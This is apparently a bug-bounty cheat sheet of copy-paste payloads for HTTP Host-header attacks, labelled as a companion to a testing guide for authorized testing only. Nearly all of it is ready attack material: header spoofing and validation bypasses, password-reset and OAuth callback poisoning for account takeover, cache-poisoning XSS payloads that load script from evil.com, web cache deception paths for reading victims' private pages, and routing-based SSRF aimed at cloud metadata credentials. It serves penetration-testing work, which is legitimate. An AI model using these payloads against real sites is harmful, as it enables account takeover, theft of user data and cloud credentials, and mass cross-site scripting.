# Host-Header Arsenal — Spoofing Headers, Validation Bypasses & Sink Payloads (copy-paste)

> Companion to `HOST_HEADER_INJECTION_TESTING_GUIDE.md`. Authorized testing only — own accounts, benign markers,
> non-shared cache keys (Guide §19). The finding is the **sink impact** (ATO / mass XSS / SSRF), not a reflected header.

---

## 1. The host-spoofing header set (Guide §5)

```
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
X-Original-Host: evil.com
X-Original-URL: /                       (+ X-Rewrite-URL on some stacks)
Forwarded: host=evil.com
# absolute URI in the request line (send raw via Burp):
GET https://evil.com/path HTTP/1.1
Host: target.com
# combine: keep a VALID Host while testing forwarding headers so the request still routes.
```

## 2. Host-validation bypasses (Guide §7)

```
# duplicate Host (front-end validates one, backend uses the other)
Host: target.com
Host: evil.com

# port / userinfo confusion
Host: target.com:@evil.com
Host: target.com@evil.com
Host: evil.com:80
Host: target.com:8080@evil.com

# line wrapping / whitespace (raw, via Burp; mind it can overlap request smuggling)
Host: target.com
 Host: evil.com                          (leading space = folded header on some parsers)
Host:%20target.com%09evil.com

# weak allowlist matching
Host: target.com.evil.com                (suffix you control)
Host: eviltarget.com                     ("contains target.com")
Host: target.com.                         (trailing dot)
Host: TARGET.com                          (case)

# SNI vs Host mismatch (front-end routes on SNI, app trusts Host)
# (set TLS SNI = target.com, Host: internal-admin)
```

## 2b. Related forwarding headers — own sinks (Guide §5.1)
```
X-Forwarded-Scheme: http        X-Forwarded-Proto: http      → downgrade links/redirects to http:// (chain cache/open-redirect; sometimes redirect-loop DoS)
X-Forwarded-Port: 1337          X-Forwarded-Host: evil.com:1337  → port lands in absolute links/redirects → SSRF/redirect
X-Original-URL: /admin          X-Rewrite-URL: /admin        X-Override-URL: /admin   → override the PATH after the proxy's ACL check → reach /admin/internal (auth bypass)
X-Forwarded-For: 127.0.0.1      True-Client-IP: 127.0.0.1    X-Real-IP: 127.0.0.1     → IP-allowlist / rate-limit bypass, log spoofing, SSRF if fetched
# combine: a valid Host + one of these forwarding headers; test each sink (link/redirect/ACL/IP-gate) separately.
```

## 3. Quick reflection / acceptance probes (Guide §4)

```bash
T=https://target/
curl -s -D - -o /dev/null "$T" -H "Host: evil-hh-test.example" | grep -iE 'location|evil-hh-test'
curl -s "$T" -H "X-Forwarded-Host: evil-hh-test.example" | grep -i 'evil-hh-test'
# watch: response body, Location, canonical/og links, and (for reset) the EMAIL you receive.
```

## 4. Password-reset poisoning (Guide §11) ⭐

```
# trigger a reset for YOUR OWN account with a spoofed host:
POST /api/forgot-password
Host: evil.com                               (or:)
X-Forwarded-Host: evil.com
{ "email": "you@yourdomain.com" }
# then read YOUR email — if the link is  https://evil.com/reset?token=...  → poisoning confirmed (ATO).
# variants: X-Forwarded-Host when Host is fixed; dangling-markup partial host; server-side token callback (no click).
```

## 5. Web-cache poisoning (Guide §12) ⭐

```
# 1) reflect + cache check
GET /?cb=UNIQUE123
X-Forwarded-Host: evil.com
# look for: response reflects evil.com  AND  Age: / Cache-Control: public / X-Cache: hit on repeat.
# 2) poison (benign first, on a NON-shared key you control):
X-Forwarded-Host: evil.com"><script src=//evil.com/x.js></script>
X-Forwarded-Host: a."><img src=x onerror=alert(document.domain)>
# 3) mass redirect variant:
X-Forwarded-Host: evil.com           (cached absolute links/redirects now point at evil.com)
# use Burp Param Miner to confirm the header is UNKEYED (served to others).
```

## 5b. Cache-keying & unkeyed-input set (Guide §12.1)
```
# always test with a UNIQUE cache-buster so you only poison YOUR key:  GET /path?cb=<rand>
# unkeyed inputs to fuzz (Burp Param Miner → "guess headers"/"guess GET params"):
X-Forwarded-Host  X-Host  X-Forwarded-Scheme  X-Forwarded-Proto  X-Forwarded-Port  X-Forwarded-Server
X-Original-URL  X-Rewrite-URL  X-Override-URL  (custom app headers)  (sometimes Cookie / an unkeyed query param)
# confirm exploitability: send poison (with ?cb=) → then a CLEAN request to the SAME keyed URL → payload served from
#   cache (X-Cache: hit / Age) = unkeyed + cacheable = poisonable. Then DESCRIBE shared impact (don't poison real pages).
# key-normalization flaws to probe: case, port, trailing slash, %-decoding collapsing onto a victim's key; "fat GET"
#   (a body/duplicate param the cache ignores but the origin honors).
```

## 5c. Web Cache Deception (WCD) — read a victim's cached private page (Guide §12.2)
```
# the origin returns the SAME authenticated page for a path with a "static-looking" suffix, and the cache caches by
# extension regardless of auth → the victim's PRIVATE response gets cached at a URL YOU can read.
GET /account/info/nonexistent.css        # origin ignores the suffix → returns the private account page; cache stores *.css
GET /account/info/x.js                    GET /account/settings/x.jpg
GET /account/info;x.css                   GET /account/info%2Fx.css        GET /account/info?x.css
# test: request your OWN account page with the suffix, confirm it's cached (Age/X-Cache:hit) AND readable without your
#   cookie (open in a fresh/incognito session). If yes → WCD: any user's private data leaks via their cached page.
# (Prove with your own account; never harvest real users.)
```

## 6. Routing-based SSRF (Guide §13) ⭐

```
Host: localhost
Host: 127.0.0.1
Host: 169.254.169.254                        → cloud metadata → IAM creds (SSRF kit §11) → cloud/RCE
Host: internal-admin
Host: <internal-vhost-or-ip>
Host: YOURID.oast.pro                         → OOB confirm (DNS/HTTP hit from the front-end = routing reach)
# also via X-Forwarded-Host / absolute URI. Watch for DIFFERENT (internal) content or the OOB hit.
```

## 7. Reflected-host XSS (Guide §10)

```
Host: evil.com"><script>alert(document.domain)</script>
X-Forwarded-Host: "><img src=x onerror=alert(document.domain)>
X-Forwarded-Host: javascript:alert(document.domain)          (if it lands in an href)
# if the reflecting page is CACHED → this becomes stored XSS for all users (§12).
```

## 8. SSO / OAuth callback poisoning (Guide §14)

```
# if redirect_uri/callback is built from the host:
Host: evil.com            → auth code/token delivered to evil.com → ATO
X-Forwarded-Host: evil.com
# cross-ref the JWT/CORS kits for using the stolen code/token.
```

## 8b. Real-world Host-header chains, CVEs & references (guide §11-§14)
```
□ Password-reset poisoning → ATO — the classic; reported across countless programs (Django, Rails, Laravel, custom).
   Strongest variant: server-side token CALLBACK to the host (no victim click) → silent ATO.
□ Web-cache poisoning via Host/X-Forwarded-Host (James Kettle "Practical Web Cache Poisoning") — unkeyed header →
   mass stored XSS / mass redirect; check Age/X-Cache/CF-Cache-Status + Param Miner for unkeyed inputs.
□ Routing-based SSRF (James Kettle "Cracking the lens") — Host selects the backend → reach internal vhosts /
   169.254.169.254 → IAM creds → cloud takeover (SSRF kit §11). Confirm blind via Host: <id>.oast.pro.
□ Django CVE-class: ALLOWED_HOSTS misconfig → Host poisoning of password-reset & absolute URLs.
□ OAuth callback/redirect_uri built from Host → auth-code/token delivered to attacker domain → ATO (§8; JWT/CORS kits).
□ X-Forwarded-Host trusted behind a CDN/proxy even when Host is validated — the universal bypass; always test it.
□ Host/SNI desync & duplicate-Host overlap with REQUEST SMUGGLING — see that kit for front-end/back-end discrepancies.
□ Cache-poisoned stored XSS targeting ADMINS → admin session → admin code-exec feature → RCE (guide §13.1).
```
> **References:** PortSwigger *HTTP Host header attacks* + *Web cache poisoning* (Academy + labs), James Kettle research
> ("Practical Web Cache Poisoning", "Cracking the lens"), PayloadsAllTheThings (Request smuggling/Host header),
> HackTricks *Host header injection* & *Cache poisoning*, OWASP, Hackviser & PentesterLab modules, Burp Param Miner.

---

## 9. Triage rules (don't waste a report)

```
reset email link host = request host/X-Forwarded-Host        → REPORT reset-poisoning → ATO (High; Critical if no click)
host reflected + cacheable + UNKEYED                          → REPORT cache poisoning → mass XSS/redirect (High–Critical)
changing host reaches internal/metadata/OOB                  → REPORT routing SSRF (Critical; → RCE/cloud, SSRF kit)
host in OAuth callback → token to evil.com                   → REPORT ATO (High)
host in absolute redirect only                                → open redirect (Medium; up if token leak)
host reflected, NO security sink                              → Low/Info — keep hunting
X-Forwarded-Host merely ACCEPTED, no observable effect        → NOT a finding (accepting ≠ using)
```
